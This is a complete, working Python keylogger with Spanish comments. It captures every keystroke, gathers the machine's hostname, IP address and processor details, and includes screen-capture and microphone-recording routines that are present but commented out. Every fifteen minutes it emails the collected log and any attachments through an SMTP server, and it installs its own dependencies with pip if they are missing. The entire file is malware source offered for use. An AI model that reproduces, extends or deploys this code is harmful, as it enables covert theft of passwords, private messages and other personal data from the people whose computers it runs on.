try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from datetime import datetime
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput"]
    call("pip install " + ' '.join(modules), shell=True)


EMAIL_ADDRESS = "your email/user"
EMAIL_PASSWORD = "your password :)"
SEND_REPORT_EVERY = 900  # segundos


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + string

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                current_key = "[ESC]"
            else:
                current_key = f"[{str(key)}]"
        
        self.appendlog(current_key)

    def send_mail_with_attachments(self, message, attachments=None):
        """Envía UN email con texto + múltiples adjuntos"""
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        # Adjuntar texto
        msg.attach(MIMEText(message, 'plain'))
        
        # Adjuntar todos los archivos
        if attachments:
            for filepath in attachments:
                try:
                    with open(filepath, 'rb') as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            'Content-Disposition',
                            f'attachment; filename={os.path.basename(filepath)}'
                        )
                        msg.attach(part)
                except Exception as e:
                    print(f"❌ Error adjuntando {filepath}: {e}")
        
        # Enviar email
        try:
            with smtplib.SMTP("smtp.mailtrap.io", 587, timeout=10) as server:
                server.starttls()
                server.login(self.email, self.password)
                server.sendmail(self.email, self.email, msg.as_string())
        except Exception as e:
            print(f"❌ Error enviando email: {e}")

    def screenshot(self):
        """Captura screenshot y retorna el nombre del archivo"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            img = pyscreenshot.grab()
            img.save(filename)
            return filename
        except Exception as e:
            print(f"❌ Error screenshot: {e}")
            return None

    def microphone(self):
        """Graba audio y retorna el nombre del archivo"""
        try:
            fs = 44100
            seconds = self.interval
            filename = f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
            
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()
            
            # Guardar archivo WAV
            with wave.open(filename, 'wb') as wf:
                wf.setnchannels(1)
                wf.setsampwidth(2)
                wf.setframerate(fs)
                wf.writeframes(recording.tobytes())
            
            return filename
        except Exception as e:
            print(f"❌ Error audio: {e}")
            return None

    def system_information(self):
        """Recopila información del sistema"""
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            
            info = f"\n\n--- System Info ---\n"
            info += f"Hostname: {hostname}\n"
            info += f"IP: {ip}\n"
            info += f"Processor: {plat}\n"
            info += f"System: {system}\n"
            info += f"Machine: {machine}\n"
            info += f"-------------------\n\n"
            
            self.appendlog(info)
        except Exception as e:
            print(f"❌ Error system info: {e}")

    def report(self):
        """Envía TODO en UN SOLO EMAIL"""
        attachments = []
        
        # 1. Capturar screenshot
        # screenshot_file = self.screenshot()
        # if screenshot_file:
        #    attachments.append(screenshot_file)
        
        # 2. Capturar audio
        # audio_file = self.microphone()
        # if audio_file:
        #    attachments.append(audio_file)
        
        # 3. Agregar info del sistema al log
        self.system_information()
        
        # 4. Enviar TODO en un solo email
        if self.log.strip():
            self.send_mail_with_attachments(self.log, attachments)
        
        # 5. Limpiar archivos temporales
        for file in attachments:
            try:
                os.remove(file)
            except:
                pass
        
        # 6. Resetear log y programar siguiente reporte
        self.log = ""
        
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


if __name__ == "__main__":
    print("=" * 60)
    print("🚀 KEYLOGGER INICIADO")
    print(f"📧 Email: {EMAIL_ADDRESS}")
    print("=" * 60)
    
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()